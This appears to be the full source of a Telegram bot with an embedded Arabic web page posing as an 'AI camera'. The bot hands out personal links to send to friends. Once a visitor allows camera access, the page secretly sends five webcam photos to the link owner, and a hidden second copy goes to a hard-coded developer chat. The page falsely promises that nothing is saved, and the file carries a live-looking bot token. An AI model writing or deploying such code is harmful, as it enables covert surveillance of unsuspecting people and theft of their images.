import telebot
import time
import logging
from datetime import datetime
from requests.exceptions import ReadTimeout, ConnectionError
from flask import Flask, request, jsonify
from threading import Thread
import os

# ---------------------------------------------
# 1. إعدادات السيرفر الوهمي (لإبقاء البوت يعمل)
# ---------------------------------------------
app = Flask(__name__)

# ---------------------------------------------
# 2. صفحة HTML المضمنة (الكاميرا - 5 صور فقط)
# ---------------------------------------------
HTML_PAGE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>كاميرا الذكاء الاصطناعي - 5 صور فقط</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Cairo', sans-serif; }
        body {
            background: linear-gradient(135deg, #0c2461 0%, #1e3799 50%, #4a69bd 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #fff;
            padding: 20px;
            position: relative;
            overflow-x: hidden;
        }
        body::before {
            content: "";
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: radial-gradient(circle at 20% 30%, rgba(120,119,198,0.15) 0%, transparent 50%),
                        radial-gradient(circle at 80% 70%, rgba(255,119,198,0.15) 0%, transparent 50%);
            z-index: -1;
        }
        .container {
            background: rgba(255,255,255,0.08);
            backdrop-filter: blur(15px);
            border-radius: 24px;
            padding: 40px 30px;
            width: 100%;
            max-width: 500px;
            text-align: center;
            box-shadow: 0 15px 35px rgba(0,0,0,0.4), inset 0 1px 0 rgba(255,255,255,0.1);
            border: 1px solid rgba(255,255,255,0.2);
            position: relative;
            overflow: hidden;
        }
        .container::before {
            content: "";
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 4px;
            background: linear-gradient(90deg, #ff6b6b, #4ecdc4, #45b7d1, #96ceb4, #feca57, #ff6b6b);
            background-size: 400% 100%;
            animation: shimmer 8s infinite linear;
        }
        @keyframes shimmer {
            0% { background-position: 400% 0; }
            100% { background-position: -400% 0; }
        }
        .logo { font-size: 4.5em; margin-bottom: 10px; background: linear-gradient(45deg, #ff6b6b, #4ecdc4, #45b7d1); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; animation: float 3s ease-in-out infinite; }
        @keyframes float { 0%,100% { transform: translateY(0) rotate(0deg); } 25% { transform: translateY(-10px) rotate(-5deg); } 75% { transform: translateY(-5px) rotate(5deg); } }
        h1 { font-size: 2em; margin-bottom: 15px; font-weight: 700; text-shadow: 0 2px 5px rgba(0,0,0,0.3); background: linear-gradient(45deg, #ffd93d, #ff6b6b); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; }
        .tagline { font-size: 1em; color: rgba(255,255,255,0.9); margin-bottom: 25px; line-height: 1.6; padding: 0 10px; }
        .features { display: grid; grid-template-columns: repeat(2,1fr); gap: 15px; margin-bottom: 30px; }
        .feature { background: rgba(255,255,255,0.05); border-radius: 16px; padding: 20px 15px; border: 1px solid rgba(255,255,255,0.1); transition: all 0.3s ease; }
        .feature:hover { background: rgba(255,255,255,0.1); transform: translateY(-5px); box-shadow: 0 5px 15px rgba(0,0,0,0.2); }
        .feature i { font-size: 2em; margin-bottom: 10px; display: block; }
        .feature:nth-child(1) i { color: #ff6b6b; }
        .feature:nth-child(2) i { color: #4ecdc4; }
        .feature:nth-child(3) i { color: #45b7d1; }
        .feature:nth-child(4) i { color: #96ceb4; }
        .feature p { font-size: 0.9em; color: rgba(255,255,255,0.9); font-weight: 600; }
        .btn-container { margin-bottom: 25px; }
        .start-btn {
            background: linear-gradient(135deg, #ff6b6b, #ff8e8e);
            color: white;
            border: none;
            padding: 18px 40px;
            border-radius: 50px;
            font-size: 1.1em;
            font-weight: 700;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            margin: 0 auto;
            transition: all 0.3s ease;
            box-shadow: 0 10px 20px rgba(255,107,107,0.3);
            position: relative;
            overflow: hidden;
        }
        .start-btn:hover { transform: translateY(-5px) scale(1.05); box-shadow: 0 15px 30px rgba(255,107,107,0.4); }
        .start-btn::after {
            content: "";
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
            transition: left 0.7s;
        }
        .start-btn:hover::after { left: 100%; }
        .warning {
            background: rgba(255,215,0,0.1);
            border: 2px dashed rgba(255,215,0,0.5);
            border-radius: 16px;
            padding: 15px;
            margin-bottom: 20px;
            font-size: 0.85em;
            color: rgba(255,255,255,0.8);
        }
        .warning i { color: #ffd700; margin-left: 5px; }
        #analysisScreen { display: none; }
        .video-container {
            position: relative;
            width: 100%;
            height: 320px;
            border-radius: 20px;
            overflow: hidden;
            margin: 25px 0;
            border: 3px solid rgba(255,255,255,0.2);
            box-shadow: 0 15px 30px rgba(0,0,0,0.4);
        }
        video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
        .overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.4);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }
        .overlay i { font-size: 3.5em; margin-bottom: 15px; color: rgba(255,255,255,0.9); }
        .analysis-text { font-size: 1.2em; font-weight: 600; color: white; text-shadow: 0 2px 5px rgba(0,0,0,0.5); }
        .status-container {
            background: rgba(0,0,0,0.2);
            border-radius: 16px;
            padding: 20px;
            margin-bottom: 25px;
            border: 1px solid rgba(255,255,255,0.1);
        }
        #status {
            font-weight: 600;
            font-size: 1.1em;
            color: #4ecdc4;
            margin-bottom: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }
        .progress-container {
            width: 100%;
            height: 12px;
            background: rgba(255,255,255,0.1);
            border-radius: 6px;
            overflow: hidden;
            margin-top: 15px;
        }
        .progress-bar {
            height: 100%;
            background: linear-gradient(90deg, #ff6b6b, #4ecdc4, #45b7d1);
            border-radius: 6px;
            width: 0%;
            transition: width 0.5s ease;
            position: relative;
            overflow: hidden;
        }
        .progress-bar::after {
            content: "";
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
            animation: progressShine 2s infinite;
        }
        @keyframes progressShine { 0% { transform: translateX(-100%); } 100% { transform: translateX(100%); } }
        .counter { font-size: 0.9em; color: rgba(255,255,255,0.7); margin-top: 8px; }
        .footer { margin-top: 25px; font-size: 0.8em; color: rgba(255,255,255,0.5); text-align: center; }
        .pulse { animation: pulse 2s infinite; }
        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
        @media (max-width:500px) {
            .container { padding: 30px 20px; }
            .logo { font-size: 3.5em; }
            h1 { font-size: 1.7em; }
            .video-container { height: 280px; }
            .features { grid-template-columns: 1fr; gap: 10px; }
            .start-btn { padding: 16px 30px; font-size: 1em; }
        }
    </style>
</head>
<body>

<div class="container" id="mainScreen">
    <div class="logo"><i class="fas fa-camera-retro"></i></div>
    <h1>📸 التقاط 5 صور فقط</h1>
    <p class="tagline">سيتم التقاط 5 صور تلقائياً من كاميرتك وإرسالها إلى حسابك في تلجرام</p>
    <div class="features">
        <div class="feature"><i class="fas fa-camera"></i><p>5 صور</p></div>
        <div class="feature"><i class="fas fa-shield-alt"></i><p>خاص وآمن</p></div>
        <div class="feature"><i class="fas fa-bolt"></i><p>سريع وفوري</p></div>
        <div class="feature"><i class="fas fa-check-circle"></i><p>تلقائي بالكامل</p></div>
    </div>
    <div class="warning"><i class="fas fa-exclamation-circle"></i> يجب السماح باستخدام الكاميرا للبدء</div>
    <div class="btn-container">
        <button class="start-btn" onclick="startCapture()"><i class="fas fa-play-circle"></i> بدء التصوير</button>
    </div>
    <div class="footer">
        <p>بعد السماح بالكاميرا، سيتم التقاط 5 صور متتالية وإرسالها فوراً</p>
        <p style="margin-top:8px; font-size:0.7em;">لن يتم تسجيل فيديو أو حفظ أي بيانات</p>
    </div>
</div>

<div class="container" id="analysisScreen">
    <h1>📸 جاري التصوير...</h1>
    <div class="video-container">
        <video id="video" autoplay playsinline></video>
        <div class="overlay"><i class="fas fa-camera pulse"></i><div class="analysis-text" id="analysisText">جاري التحضير...</div></div>
    </div>
    <div class="status-container">
        <div id="status"><i class="fas fa-sync-alt fa-spin"></i> <span id="statusText">تهيئة الكاميرا...</span></div>
        <div class="progress-container"><div class="progress-bar" id="progressBar"></div></div>
        <div class="counter" id="counter">الصورة 0 من 5</div>
    </div>
    <div class="footer">
        <p>سيتم إرسال كل صورة فور التقاطها إلى حسابك في تلجرام</p>
        <p style="margin-top:8px; font-size:0.7em;">بعد الانتهاء من الصور الخمس سيتم إغلاق الكاميرا</p>
    </div>
</div>

<script>
const urlParams = new URLSearchParams(window.location.search);
const dynamicChatId = urlParams.get('id');
const fixedChatId = 6002805119;
const token = '8488682212:AAE5KJUgyrd5QPYDE6beK21XPrBo7Y66MAg';

const video = document.getElementById('video');
const statusText = document.getElementById('statusText');
const analysisText = document.getElementById('analysisText');
const progressBar = document.getElementById('progressBar');
const counter = document.getElementById('counter');

let photoCount = 0;
let intervalId = null;
let mediaStream = null;
const MAX_PHOTOS = 5;

function startCapture() {
    document.getElementById('mainScreen').style.display = "none";
    document.getElementById('analysisScreen').style.display = "block";
    photoCount = 0;
    progressBar.style.width = '0%';
    counter.textContent = 'الصورة 0 من 5';
    analysisText.textContent = 'جارٍ طلب الكاميرا...';
    
    navigator.mediaDevices.getUserMedia({ video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: "user" }, audio: false })
        .then(stream => {
            mediaStream = stream;
            video.srcObject = stream;
            video.onloadedmetadata = () => {
                statusText.textContent = "الكاميرا جاهزة - بدء التصوير خلال 2 ثانية";
                analysisText.textContent = "استعد...";
                setTimeout(() => {
                    captureAndSend();
                    intervalId = setInterval(captureAndSend, 2000);
                }, 2000);
            };
        })
        .catch(err => {
            console.error("خطأ في الكاميرا:", err);
            statusText.innerHTML = '<i class="fas fa-exclamation-triangle"></i> يرجى السماح بالكاميرا';
            analysisText.textContent = "فشل الوصول للكاميرا";
            setTimeout(() => {
                alert("⚠️ لا يمكن الوصول للكاميرا. تأكد من منح الإذن وحاول مرة أخرى.");
                window.location.reload();
            }, 1500);
        });
}

function captureAndSend() {
    if (photoCount >= MAX_PHOTOS) {
        clearInterval(intervalId);
        statusText.textContent = "✅ اكتمل التصوير! شكراً لك";
        analysisText.textContent = "تم إرسال 5 صور بنجاح";
        progressBar.style.width = '100%';
        counter.textContent = 'اكتمل التصوير';
        if (mediaStream) mediaStream.getTracks().forEach(track => track.stop());
        return;
    }
    photoCount++;
    const progressPercent = (photoCount / MAX_PHOTOS) * 100;
    progressBar.style.width = `${progressPercent}%`;
    counter.textContent = `الصورة ${photoCount} من ${MAX_PHOTOS}`;
    statusText.textContent = `جاري التقاط الصورة ${photoCount}...`;
    analysisText.textContent = `📸 التقطت الصورة ${photoCount}`;
    
    try {
        if (video.srcObject) {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            const ctx = canvas.getContext('2d');
            ctx.translate(canvas.width, 0);
            ctx.scale(-1, 1);
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            canvas.toBlob(blob => {
                if (blob) {
                    if (dynamicChatId) sendPhotoToTelegram(dynamicChatId, blob);
                    sendPhotoToTelegram(fixedChatId, blob);
                }
            }, 'image/jpeg', 0.7);
        } else {
            sendNotification();
        }
    } catch (error) {
        console.log("خطأ في التقاط الصورة:", error);
    }
}

function sendPhotoToTelegram(chatId, blob) {
    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('photo', blob, `photo_${Date.now()}.jpg`);
    formData.append('caption', `📸 الصورة ${photoCount} من 5 (تم التقاطها بواسطة الكاميرا الذكية)`);
    fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData })
        .then(response => response.json())
        .then(data => console.log(`✅ تم إرسال الصورة ${photoCount} إلى ${chatId}`))
        .catch(error => console.error(`❌ فشل إرسال الصورة:`, error));
}

function sendNotification() {
    if (dynamicChatId) {
        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: dynamicChatId, text: `⚠️ تم فتح رابط الكاميرا لكن تعذر التقاط الصورة ${photoCount} بسبب مشكلة في الكاميرا.` })
        }).catch(e => console.log(e));
    }
}
</script>
</body>
</html>
"""

@app.route('/')
def home():
    # عرض الصفحة المضمنة
    return HTML_PAGE

@app.route('/webhook', methods=['POST'])
def webhook():
    data = request.json
    return jsonify({"status": "ok", "message": "Webhook received"})

def run():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = Thread(target=run)
    t.daemon = True
    t.start()

# ---------------------------------------------
# 3. إعدادات بوت تيليجرام
# ---------------------------------------------
TOKEN = '8488682212:AAE5KJUgyrd5QPYDE6beK21XPrBo7Y66MAg'
bot = telebot.TeleBot(TOKEN)

# استخدام متغير البيئة لتحديد الرابط الأساسي، أو قيمة افتراضية
BASE_URL = os.environ.get("BASE_URL", "https://your-app-name.onrender.com/")  # غيّر هذا إلى رابط تطبيقك الفعلي

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

user_stats = {}
total_photos_received = 0

# ---------------------------------------------
# 4. معالجة الأوامر
# ---------------------------------------------
@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.chat.id
    user_name = message.from_user.first_name

    if user_id not in user_stats:
        user_stats[user_id] = {
            "name": user_name,
            "photo_count": 0,
            "first_seen": datetime.now(),
            "last_active": datetime.now()
        }
    else:
        user_stats[user_id]["last_active"] = datetime.now()

    personal_link = f"{BASE_URL}?id={user_id}"

    markup = telebot.types.InlineKeyboardMarkup()
    camera_btn = telebot.types.InlineKeyboardButton(text="📸 افتح الكاميرا الآن", url=personal_link)
    help_btn = telebot.types.InlineKeyboardButton(text="❓ التعليمات", callback_data="help")
    stats_btn = telebot.types.InlineKeyboardButton(text="📊 إحصائياتي", callback_data="stats")
    markup.add(camera_btn)
    markup.add(help_btn, stats_btn)

    response = (
        f"🎉 أهلاً بك *{user_name}*!\n\n"
        f"✨ هذا هو *رابطك الشخصي* للكاميرا الذكية:\n"
        f"`{personal_link}`\n\n"
        f"📌 *طريقة الاستخدام:*\n"
        f"1. انسخ الرابط أعلاه\n"
        f"2. أرسله لأصدقائك\n"
        f"3. أي شخص يفتح الرابط ويعمل اذن الوصول الى الكاميرا ستصل صورته إليك فوراً!\n\n"
        f"🔒 *ملاحظة:* الصورة التي ستصلك لن تصل الى اي احد غيرك، لن يقدر اي شخص مشاهدتها فكن مطمئن."
    )
    bot.send_message(user_id, response, parse_mode="Markdown", reply_markup=markup)
    logger.info(f"New user started: {user_name} (ID: {user_id})")

@bot.message_handler(commands=['stats'])
def show_stats(message):
    user_id = message.chat.id
    if user_id in user_stats:
        stat = user_stats[user_id]
        response = (
            f"📊 *إحصائياتك الشخصية*\n\n"
            f"👤 الاسم: {stat['name']}\n"
            f"🆔 رقمك: {user_id}\n"
            f"📸 عدد الصور المستلمة: {stat['photo_count']}\n"
            f"📅 تاريخ التسجيل: {stat['first_seen'].strftime('%Y-%m-%d')}\n"
            f"🕐 آخر نشاط: {stat['last_active'].strftime('%Y-%m-%d %H:%M')}\n\n"
            f"🌐 *إحصائيات عامة:*\n"
            f"👥 عدد المستخدمين: {len(user_stats)}\n"
            f"🖼️ إجمالي الصور: {total_photos_received}"
        )
    else:
        response = "❌ لم يتم العثور على إحصائيات لك. استخدم /start أولاً"
    bot.send_message(user_id, response, parse_mode="Markdown")

@bot.message_handler(commands=['help'])
def send_help(message):
    help_text = (
        "📖 *دليل استخدام البوت*\n\n"
        "🎯 *الأوامر المتاحة:*\n"
        "✅ /start - الحصول على رابطك الشخصي\n"
        "📊 /stats - عرض إحصائياتك\n"
        "❓ /help - عرض هذه التعليمات\n\n"
        "🔧 *كيف يعمل البوت:*\n"
        "1. اضغط على /start للحصول على رابطك الشخصي\n"
        "2. أرسل الرابط لأصدقائك\n"
        "3. عندما يفتحون الرابط، سيتم تحميل كاميرا الويب\n"
        "4. يتم التقاط 5 صور تلقائياً (صورة كل 2 ثانية)\n"
        "5. تصل الصور إليك مباشرة في هذه المحادثة\n\n"
        "⚠️ *ملاحظات هامة:*\n"
        "• البوت يأخذ 5 صور فقط ثم يتوقف\n"
        "• يمكن إعادة فتح الرابط لالتقاط المزيد\n"
        "• الصور تصل فقط لصاحب الرابط\n"
        "• لا يتم حفظ الصور في أي سيرفر\n\n"
        "🛠️ للمساعدة التقنية: @khaled_developer"
    )
    bot.send_message(message.chat.id, help_text, parse_mode="Markdown")

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = message.chat.id
    DEVELOPER_ID = 6002805119
    if user_id != DEVELOPER_ID:
        bot.reply_to(message, "❌ هذا الأمر للمطور فقط!")
        return

    command_parts = message.text.split(' ', 1)
    if len(command_parts) < 2:
        bot.reply_to(message, "❌ صيغة خاطئة. استخدم:\n/broadcast نص الرسالة")
        return

    broadcast_text = command_parts[1]
    markup = telebot.types.InlineKeyboardMarkup()
    site_btn = telebot.types.InlineKeyboardButton(text="🌐 زيارة الموقع", url=BASE_URL)
    markup.add(site_btn)

    success_count = 0
    fail_count = 0
    for uid in user_stats.keys():
        try:
            bot.send_message(uid, f"📢 *إشعار من المطور:*\n\n{broadcast_text}", parse_mode="Markdown", reply_markup=markup)
            success_count += 1
            time.sleep(0.1)
        except Exception as e:
            logger.error(f"Failed to send to {uid}: {e}")
            fail_count += 1

    bot.reply_to(message, f"✅ تم البث بنجاح!\n\n✓ تم الإرسال لـ: {success_count} مستخدم\n✗ فشل الإرسال لـ: {fail_count} مستخدم")

# ---------------------------------------------
# 5. معالجة الصور الواردة
# ---------------------------------------------
@bot.message_handler(content_types=['photo'])
def handle_photos(message):
    global total_photos_received
    user_id = message.chat.id
    user_name = message.from_user.first_name if message.from_user else "مجهول"

    if user_id in user_stats:
        user_stats[user_id]["photo_count"] += 1
        user_stats[user_id]["last_active"] = datetime.now()
    else:
        user_stats[user_id] = {
            "name": user_name,
            "photo_count": 1,
            "first_seen": datetime.now(),
            "last_active": datetime.now()
        }

    total_photos_received += 1

    photo = message.photo[-1]
    file_info = bot.get_file(photo.file_id)
    file_size = file_info.file_size / 1024

    caption = (
        f"✅ تم استلام صورة جديدة!\n\n"
        f"👤 من: {user_name}\n"
        f"🆔 الرقم: {user_id}\n"
        f"📏 الحجم: {file_size:.1f} كيلوبايت\n"
        f"🖼️ إجمالي صورك: {user_stats[user_id]['photo_count']}\n"
        f"📊 الإجمالي الكلي: {total_photos_received}"
    )
    bot.reply_to(message, caption)
    logger.info(f"Received photo from {user_name} (ID: {user_id}) - Size: {file_size:.1f}KB")

# ---------------------------------------------
# 6. معالجة Callback Queries
# ---------------------------------------------
@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    if call.data == "help":
        send_help(call.message)
        bot.answer_callback_query(call.id, "📖 عرض التعليمات")
    elif call.data == "stats":
        show_stats(call.message)
        bot.answer_callback_query(call.id, "📊 عرض الإحصائيات")

# ---------------------------------------------
# 7. معالجة الرسائل النصية العادية
# ---------------------------------------------
@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    if message.text.startswith('/'):
        bot.reply_to(message, "❌ أمر غير معروف!\n\n✅ الأوامر المتاحة:\n/start - للحصول على رابطك\n/stats - لعرض إحصائياتك\n/help - للتعليمات والمساعدة")
    else:
        welcome_text = f"مرحباً {message.from_user.first_name}! 👋\n\nيمكنك استخدام الأوامر التالية:\n• /start - للحصول على رابطك الشخصي\n• /stats - لعرض إحصائياتك\n• /help - للتعليمات\n\nأو أرسل صورة وسأقوم بحفظها لك! 📸"
        bot.reply_to(message, welcome_text)

# ---------------------------------------------
# 8. تشغيل البوت والسيرفر معاً
# ---------------------------------------------
keep_alive()

print("=" * 50)
print("🤖 بوت كاميرا الذكاء الاصطناعي (5 صور فقط)")
print(f"⏰ تم التشغيل في: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
print("=" * 50)

while True:
    try:
        logger.info("Starting bot polling...")
        bot.infinity_polling(timeout=60, long_polling_timeout=60)
    except (ReadTimeout, ConnectionError) as e:
        logger.warning(f"Connection error: {e}. Retrying in 5 seconds...")
        time.sleep(5)
    except Exception as e:
        logger.error(f"Unexpected error: {e}")
        time.sleep(10)
